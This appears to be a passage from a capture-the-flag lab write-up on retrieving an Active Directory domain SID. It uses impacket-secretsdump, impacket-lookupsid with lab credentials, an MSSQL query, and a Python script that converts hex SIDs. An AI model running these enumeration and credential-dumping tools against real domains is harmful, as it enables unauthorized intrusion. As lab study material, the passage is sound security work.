
---
##### Kerberos Auth

"DRSCrackNames" will reveal the SID

We need to append the -500 at the end and we gained the Domain SID

```
impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
```
##### Password Auth

```
impacket-lookupsid scrm.local/ksimpson:'ksimpson'@10.129.44.233
```
##### Manually

Ran the following Query in MSSQL Shell.

```
SELECT master.dbo.fn_varbintohexstr(SUSER_SID()) AS HexSID;
HexSID                                                       
----------------------------------------------------------   
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```

and created the following script (with AI) to get the proper SID.

```
import struct
import sys

hex_str = input("Paste the hex SID (with or without 0x): ").strip()
hex_str = hex_str.lower()

# Remove 0x prefix if present
if hex_str.startswith("0x"):
    hex_str = hex_str[2:]

# Remove any spaces or newlines
hex_str = hex_str.replace(" ", "").replace("\n", "")

try:
    sid_bytes = bytes.fromhex(hex_str)
except ValueError as e:
    print(f"[-] Invalid hex string: {e}")
    sys.exit(1)

# Basic SID structure check
if len(sid_bytes) < 8:
    print("[-] Too few bytes for a SID.")
    sys.exit(1)

rev = sid_bytes[0]
sub_count = sid_bytes[1]
auth = int.from_bytes(sid_bytes[2:8], byteorder='big')

# The total length must be 8 + 4*sub_count
expected_len = 8 + 4 * sub_count
if len(sid_bytes) != expected_len:
    print(f"[-] Mismatched SID length. Expected {expected_len} bytes, got {len(sid_bytes)}.")
    sys.exit(1)

# Build the list of all SID components
parts = [rev, auth]
for i in range(sub_count):
    offset = 8 + 4 * i
    sub = struct.unpack_from('<I', sid_bytes, offset)[0]
    parts.append(sub)

# Build domain SID by removing the last sub-authority (the RID)
if sub_count <= 1:
    # No sub-authorities left for domain SID (shouldn't happen with user SIDs)
    print("[-] SID has too few sub-authorities.")
    sys.exit(1)

domain_parts = parts[:-1]   # drop the last RID
domain_sid = "S-" + "-".join(str(p) for p in domain_parts)
print(f"[+] Domain SID: {domain_sid}")
```

Ran the script & retrieved the Domain SID!

```
python3 /opt/arsenal/sid_converter.py
Paste the hex SID (with or without 0x): 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
[+] Domain SID: S-1-5-21-4088429403-1159899800-2753317549
```